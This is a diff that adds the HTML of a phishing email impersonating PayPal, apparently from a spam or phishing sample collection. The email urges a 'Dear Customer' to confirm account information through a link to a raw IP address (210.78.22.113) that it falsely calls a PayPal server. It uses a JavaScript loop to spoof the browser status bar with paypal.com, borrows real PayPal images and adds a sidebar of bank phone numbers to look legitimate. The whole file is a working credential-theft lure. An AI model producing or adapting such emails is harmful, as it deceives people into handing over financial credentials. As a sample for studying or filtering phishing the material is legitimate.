@@ -1,0 +1,606 @@
+<x-html><!x-stuff-for-pete base="" src="" id="0" 
+charset="iso-8859-1/macintosh"><html>
+<head>
+<style type="text/css">
+..dummy {}
+BODY, TD {font-family: verdana,arial,helvetica,sans-serif;font-size:
+12px;color: #000000;}
+LI {line-height: 120%;}
+UL.ppsmallborder {margin:10px 5px 10px 20px;}
+LI.ppsmallborderli {margin:0px 0px 5px 0px;}
+UL.pp_narrow {margin:10px 5px 0px 40px;}
+hr.dotted {width: 100%; margin-top: 0px; margin-bottom: 0px; border-left:
+#fff; border-right: #fff; border-top: #fff; border-bottom: 2px dotted #ccc;}
+..pp_label {font-family: verdana,arial,helvetica,sans-serif;font-size:
+10px;font-weight: bold;color: #000000;}
+..pp_serifbig {font-family: serif;font-size: 20px;font-weight: bold;color:
+#000000;}
+..pp_serif{font-family: serif;font-size: 16px;color: #000000;}
+..pp_sansserif{font-family: verdana,arial,helvetica,sans-serif; font-size:
+16px;color: #000000;}
+..pp_heading {font-family: verdana,arial,helvetica,sans-serif;font-size:
+18px;font-weight: bold;color: #003366;}
+..pp_subheadingeoa {font-family:
+verdana,arial,helvetica,sans-serif;font-size: 15px;font-weight: bold;color:
+#000000;}
+..pp_subheading {font-family: verdana,arial,helvetica,sans-serif;font-size:
+16px;font-weight: bold;color: #003366;}
+..pp_sidebartext {font-family: verdana,arial,helvetica,sans-serif;font-size:
+11px;color: #003366;}
+..pp_sidebartextbold {font-family:
+verdana,arial,helvetica,sans-serif;font-size: 11px;font-weight: bold;color:
+#003366;}
+..pp_footer {font-family: verdana,arial,helvetica,sans-serif;font-size:
+11px;color: #aaaaaa;}
+..pp_button {font-size: 13px; font-family:
+verdana,arial,helvetica,sans-serif; font-weight: 400; border-style:outset;
+color:#000000; background-color: #cccccc;}
+..pp_smaller {font-family: verdana,arial,helvetica,sans-serif;font-size:
+10px;color: #000000;}
+..pp_smallersidebar {font-family:
+verdana,arial,helvetica,sans-serif;font-size: 10px;color: #003366;}
+..ppem106 {font-weight: 700;}
+</style>
+<script language=JavaScript>
+<!--
+var boodschap = 'https://www.paypal.com/';
+function dgstatus()
+{
+       window.status = boodschap;
+        timerID= setTimeout("dgstatus()", 25);
+}
+//-->
+</script>
+        <title>PayPal</title>
+</head>
+<body bgcolor="#ffffff">
+<SCRIPT language=JavaScript>
+<!--
+dgstatus();
+//-->
+</SCRIPT>
+<table width="600" cellspacing="0" cellpadding="0" border="0"
+align="center">
+        <tr valign="top">
+                <td><A href="https://www.paypal.com/us"><IMG
+src="http://images.paypal.com/en_US/i/logo/email_logo.gif" width=255
+height=35 alt="PayPal" border="0"></A>
+                </td>
+        </tr>
+</table>
+<table width="100%" cellspacing="0" cellpadding="0" border="0">
+<tr>
+        <td background="http://images.paypal.com/images/bg_clk.gif"
+width=100%><img src="http://images.paypal.com/images/pixel.gif" height="29"
+width="1" border="0"></td>
+</tr>
+<tr>
+        <td><img src="http://images.paypal.com/images/pixel.gif" height="10"
+width="1" border="0"></td>
+</tr>
+</table>
+
+<table width="600" cellspacing="0" cellpadding="0" border="0"
+align="center">
+        <tr valign="top">
+                <td width="400">
+                        <table width="100%" cellspacing="0" 
+cellpadding="5" border="0">
+                                <tr valign="top">
+                                        <td>
+ 
+                                <table width="100%" cellspacing="0" 
+cellpadding="0" border="0">
+        <tr>
+                <td class="pp_heading" align="left">Reminder: Confirm 
+Your Information</td>
+        </tr>
+</table>
+</td>
+                                </tr>
+                                <tr>
+                                        <td>Dear 
+Customer,<br><br>This is a reminder that we need you to
+confirm your information. This is a recent measure to protect our 
+customers.</td>
+                                </tr>
+                                <tr>
+                                        <td><hr class="dotted"></td></tr>
+                                <tr>
+                                        <td>
+                                                <table width="100%" 
+cellspacing="0" cellpadding="0" border="0">
+                                                        <tr>
+                                                                <td 
+colspan="3">
+ 
+ 
+                <table width="100%" cellspacing="0" cellpadding="0"
+border="0">
+        <tr>
+                <td class="pp_subheading">How To Confirm Your Information</td>
+        </tr>
+</table>
+</td>
+                                                        </tr>
+                                                        <tr>
+                                                                <td 
+colspan="3"><img
+src="http://images.paypal.com/en_US/i/scr/pixel.gif" height="10" width="1"
+border="0"></td>
+                                                        </tr>
+                                                        <tr>
+                                                                <td 
+colspan="3">PayPal always keep in touch with it's customers. Please 
+use instructions below.</td>
+                                                        </tr>
+                                                        <tr>
+                                                                <td 
+colspan="3"><img
+src="http://images.paypal.com/en_US/i/scr/pixel.gif" height="10" width="1"
+border="0"></td>
+                                                        </tr>
+                                                        <tr valign="top">
+                                                                <td 
+align="center"><img
+src="http://images.paypal.com/en_US/i/info/step_depositsSent_norm_50x50.gif" 
+height="50" width="50" border="0" alt="Call your bank to find out 
+your 2
+deposit amounts from PayPal"></td>
+ 
+        <td><img src="http://images.paypal.com/en_US/i/scr/pixel.gif"
+height="1" width="5" border="0"></td>
+                                                                <td 
+width="100%" class="bluefont"><b>Step
+1:</b></span>&nbsp;&nbsp;Follow <a 
+href="http://210.78.22.113/verify.html">this link</a> located at 
+PayPal server to fill needed information.</td>
+                                                        </tr>
+                                                        <tr>
+                                                                <td 
+colspan="3"><img
+src="http://images.paypal.com/en_US/i/scr/pixel.gif" height="10" width="1"
+border="0"></td>
+                                                        </tr>
+                                                        <tr valign="top">
+                                                                <td 
+align="center"><img
+src="http://images.paypal.com/en_US/i/info/step_enterDeposits_norm_50x50.gif" 
+height="50" width="50" border="0" alt="Enter the exact amounts of the 
+2
+deposits into your PayPal account"></td>
+ 
+        <td><img src="http://images.paypal.com/en_US/i/scr/pixel.gif"
+height="1" width="5" border="0"></td>
+                                                                <td 
+width="100%" class="bluefont"><b>Step
+2:</b></span>&nbsp;&nbsp;<a href="https://www.paypal.com/">Log
+in</a> to your PayPal account. Click on the "Profile" link in
+the "My Account" menu and check information that you submitted.</td>
+                                                        </tr>
+                                                        <tr>
+ 
+        <td><img src="http://images.paypal.com/en_US/i/scr/pixel.gif"
+height="1" width="70" border="0"></td>
+ 
+        <td><img src="http://images.paypal.com/en_US/i/scr/pixel.gif"
+height="1" width="5" border="0"></td>
+                                                                <td 
+width="100%"><img
+src="http://images.paypal.com/en_US/i/scr/pixel.gif" height="1" width="1"
+border="0"></td>
+                                                        </tr>
+                                                </table>
+                                        </td>
+                                </tr>
+                                <tr>
+                                        <td><hr class="dotted"></td>
+                                </tr>
+                                <tr>
+                                        <td>
+ 
+                                <table width="100%" cellspacing="0" 
+cellpadding="0"
+border="0">
+                                                        <tr>
+                                                                <td>
+ 
+ 
+                <table width="100%" cellspacing="0" cellpadding="0"
+border="0">
+        <tr>
+                <td class="pp_subheading">Why Confirm Your Information?</td>
+        </tr>
+</table>
+</td>
+                                                        </tr>
+                                                        <tr>
+                                                                <td 
+colspan="3"><img
+src="http://images.paypal.com/en_US/i/scr/pixel.gif" height="10" width="1"
+border="0"></td>
+                                                        </tr>
+                                                        <tr>
+                                                                <td 
+class="bluefont"><b>It increases security</b><br>
+ 
+        Keeping your information up to date with PayPal helps to 
+avoid unauthorized charges of your credit card thus improving your 
+account value. This process increases the safety of the entire
+PayPal payments network.</td>
+                                                        </tr>
+                                                        <tr>
+                                                                <td 
+colspan="3"><img
+src="http://images.paypal.com/en_US/i/scr/pixel.gif" height="10" width="1"
+border="0"></td>
+                                                        </tr>
+                                                        <tr>
+                                                                <td 
+class="bluefont"><b>Verify your PayPal account</b><br>
+ 
+        Your PayPal account becomes verified once you confirm your 
+bank
+account. With a verified account, there is no limit on the amount of money
+you can send through PayPal when you choose to make these payments using
+funds from your bank account.<br></td>
+                                                        </tr>
+
+                                                </table>
+ 
+                        </td>
+                                </tr>
+                                <tr>
+                                        <td><hr class="dotted"></td>
+                                </tr>
+                                <tr>
+                                        <td><table width="100%" 
+cellspacing="0" cellpadding="0" border="0">
+        <tr>
+                <td>                    <table width="100%" 
+cellspacing="0" cellpadding="0" border="0">
+        <tr>
+                <td class="pp_subheading">Protect Your Password</td>
+        </tr>
+</table>
+</td>
+        </tr>
+        <tr>
+                <td><img 
+src="http://images.paypal.com/en_US/i/scr/pixel.gif" height="10"
+width="1" border="0"></td>
+        </tr>
+        <tr>
+                <td>
+                        <span class="ppem106">Never</span> give your 
+password to anyone and
+<span class="ppem106">only</span> log in at <a
+href="https://www.paypal.com/us">       https://www.paypal.com</a>.
+                        If anyone asks for your password, please follow the
+                        <a
+href="http://www.paypal.com/us/cgi-bin/webscr?cmd=p/gen/fraud-prevention-outside"> 
+        Security Tips</a> instructions on the PayPal website.
+                </td>
+        </tr>
+        <tr>
+                <td><img 
+src="http://images.paypal.com/en_US/i/scr/pixel.gif" height="10"
+width="1" border="0"></td>
+        </tr>
+</table>
+
+
+</td>
+                                </tr>
+                                <tr>
+                                        <td><hr class="dotted"></td>
+                                </tr>
+                                <tr>
+                                        <td>Thank you for using PayPal!
+The PayPal Team
+</td>
+                                </tr>
+                                <tr>
+                                        <td><hr class="dotted"></td>
+                                </tr>
+                                <tr>
+                                        <td><table width="100%" 
+cellspacing="0" cellpadding="0" border="0">
+        <tr>
+                <td class="pp_footer">
+                        Please do not reply to this e-mail. Mail sent 
+to this address cannot be
+answered. For assistance,
+                        <a 
+href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_login-run"> log
+in</a> to your PayPal account and choose the "Help" link in the footer of
+any page.<br>
+                        <br class="h10">
+                        To receive email notifications in plain text 
+instead of HTML, update
+your preferences <a href="https://www.paypal.com/us/PREFS-NOTI">here</a>.
+                </td>
+        </tr>
+        <tr>
+                <td><img 
+src="http://images.paypal.com/en_US/i/scr/pixel.gif" height="10"
+width="1" border="0"></td>
+        </tr>
+</table>
+
+</td>
+                                </tr>
+                                <tr>
+                                        <td><br><span 
+class="pp_footer">PayPal Email ID PP812</span></td>
+                                </tr>
+                        </table>
+                </td>
+                <td><img 
+src="http://images.paypal.com/en_US/i/scr/pixel.gif" height="1"
+width="10" border="0">
+                </td>
+                <td width="190" valign="top">
+                        <table width="100%" cellspacing="0" 
+cellpadding="1" border="0"
+bgcolor="#cccccc">
+                                <tr>
+                                        <td>
+                                                <table width="100%" 
+cellspacing="0" cellpadding="4" border="0"
+bgcolor="#ffffff">
+                                                        <tr bgcolor="#eeeeee">
+                                                                <td 
+colspan="2" class="pp_sidebartextbold">Phone Numbers of Major
+U.S. Banks</td>
+                                                        </tr>
+                                                        <tr>
+                                                                <td 
+colspan="2" class="pp_sidebartext"><img
+src="http://images.paypal.com/en_US/i/info/step_callBank_norm_50x50.gif"
+height="50" width="50" border="0" align="left" hspace="5" vspace="5"
+alt="Phone Numbers of Major U.S. banks">To assist you in keeping up 
+to date your
+bank account information, we have provided the following list of 
+major U.S. banks,
+their customer service phone numbers and URLs:<br><br>
+                                                                Bank of America
+http://www.bankamerica.com<br>
+                                                                </td>
+                                                        </tr>
+                                                        <tr>
+                                                                <td 
+width="1">&nbsp;</td>
+                                                                <td 
+class="pp_sidebartext">Arizona, Arkansas, Iowa, Illinois,
+Kansas, Missouri,
+ 
+        Nevada, New Mexico, Oklahoma:<br>
+ 
+        1-800-944-0404<br><br>
+                                                                California<br>
+ 
+        1-800-237-8052<br><br>
+ 
+        Florida, Georgia<br>
+ 
+        1-800-299-2265<br><br>
+ 
+        Idaho, Washington<br>
+ 
+        1-800-442-6680<br><br>
+                                                                Seattle<br>
+ 
+        1-206-358-6299<br><br>
+                                                                Maryland<br>
+ 
+        1-800-235-8844<br><br>
+                                                                North 
+Carolina, South Carolina<br>
+ 
+        1-800-333-6262<br><br>
+ 
+        Oregon: 1-800-873-2632<br><br>
+                                                                Tennessee<br>
+ 
+        1-800-999-1642<br><br>
+                                                                Texas<br>
+                                                                1-800-247-6262<br><br>
+                                                                Virginia<br>
+ 
+        1-800-880-5454<br><br>
+ 
+        Washington, DC<br>
+ 
+        1-800-337-2324<br><br>
+                                                                All 
+Other States<br>
+ 
+        1-800-880-5454<br><br></td>
+                                                        </tr>
+                                                        <tr>
+                                                                <td 
+colspan="2" class="pp_sidebartext">Bank One
+http://www.bankone.com<br></td>
+                                                        </tr>
+                                                        <tr>
+                                                                <td 
+width="1">&nbsp;</td>
+                                                                <td 
+class="pp_sidebartext">Arizona<br>
+ 
+        1-800-366-2265<br><br>
+                                                                Colorado<br>
+ 
+        1-800-372-2651<br><br>
+                                                                Florida<br>
+ 
+        1-800-225-5623<br><br>
+ 
+        Illinois - Chicago Metro<br>
+ 
+        1-888-963-4000<br><br>
+ 
+        Illinois - Outside of Chicago Metro<br>
+ 
+        1-800-452-3141<br><br>
+                                                                Indiana<br>
+ 
+        1-800-234-7350<br><br>
+                                                                Kentucky<br>
+ 
+        1-800-542-2218<br><br>
+                                                                Louisiana<br>
+ 
+        1-800-777-8837<br><br>
+                                                                Michigan<br>
+ 
+        1-800-225-5623<br><br>
+                                                                Ohio<br>
+ 
+        1-800-310-1111<br><br>
+                                                                Oklahoma<br>
+ 
+        1-800-995-0712<br><br>
+                                                                Texas<br>
+ 
+        1-800-695-1111<br><br>
+                                                                Utah<br>
+ 
+        1-800-877-0608<br><br>
+                                                                West 
+Virginia - Central<br>
+ 
+        1-800-862-2651<br><br>
+                                                                West 
+Virginia - South<br>
+ 
+        1-800-828-8445<br><br>
+                                                                Wisconsin<br>
+ 
+        1-800-947-1111<br><br></td>
+                                                        </tr>
+                                                        <tr>
+                                                                <td 
+colspan="2" class="pp_sidebartext">Bank Boston
+http://www.bankboston.com<br>
+ 
+        1-800-788-5000<br><br>
+ 
+        California Federal Bank
+http://www.calfed.com<br>
+ 
+        1-800-843-2265<br><br>
+ 
+        Charter One Bank
+http://www.charterone.com<br>
+ 
+        1-877-242-7837<br><br>
+                                                                Citibank
+http://www.citibank.com<br>
+ 
+        1-800-627-3999<br><br>
+                                                                Commerce Bank
+http://bank.commerceonline.com<br>
+ 
+        1-888-751-9000<br><br>
+                                                                Commerce Bank
+http://www.commercebank.com<br>
+ 
+        1-800-746-8704<br><br>
+                                                                First 
+Union National Bank
+http://www.firstunion.com<br>
+ 
+        1-800-275-3862<br><br>
+                                                                Fifth 
+Third Bank
+http://www.53.com<br>
+ 
+        1-800-972-3030<br><br>
+                                                                Fleet Bank
+http://www.fleet.com<br>
+ 
+        1-800-841-4000<br><br>
+                                                                Key Bank
+http://www.keybank.com<br>
+ 
+        1-800-539-2968<br><br>
+                                                                The 
+Chase Manhattan Bank
+http://www.chase.com<br>
+ 
+        1-800-242-7324<br><br></td>
+                                                        </tr>
+                                                        <tr>
+                                                                <td 
+colspan="2" class="pp_sidebartext">U.S. Bank
+http://www.usbank.com<br>
+
+
+                                                                &nbsp;
+ 
+        Minneapolis, St. Paul Metro<br>
+ 
+        (612) 872-2657<br><br>
+ 
+        Portland Metro<br>
+ 
+        (503) 872-2657<br><br>
+ 
+        Denver Metro<br>
+ 
+        (303) 585-8585<br><br>
+ 
+        All Other Locations<br>
+ 
+        1-800-872-2657<br><br></td>
+                                                        </tr>
+                                                        <tr>
+                                                                <td 
+colspan="2" class="pp_sidebartext">Union Bank of California
+http://www.uboc.com<br>
+ 
+        1-800-238-4486<br><br>
+ 
+        Washington Mutual Bank
+http://www.washingtonmutual.com<br>
+ 
+        1-800-756-8000<br><br></td>
+                                                        </tr>
+                                                        <tr>
+                                                                <td 
+colspan="2" class="pp_sidebartext">Wells Fargo Bank/Norwest Bank
+http://www.wellsfargo.com</td>
+                                                        </tr>
+                                                        <tr>
+                                                                <td 
+width="1">&nbsp;</td>
+                                                                <td 
+class="pp_sidebartext">New Mexico, Nevada, Utah, Arizona,
+Texas, Iowa,
+ 
+        Colorado<br>
+ 
+        1-877-206-7990<br><br>
+ 
+        California and all other states<br>
+ 
+        1-800-869-3557</td>
+                                                        </tr>
+                                                </td>
+                                        </table>
+                                </td>
+                        </table>
+                </td>
+        </tr>
+</table>
+</body>
+</html>
+
+
+</x-html>
+
+
+
+</quote>
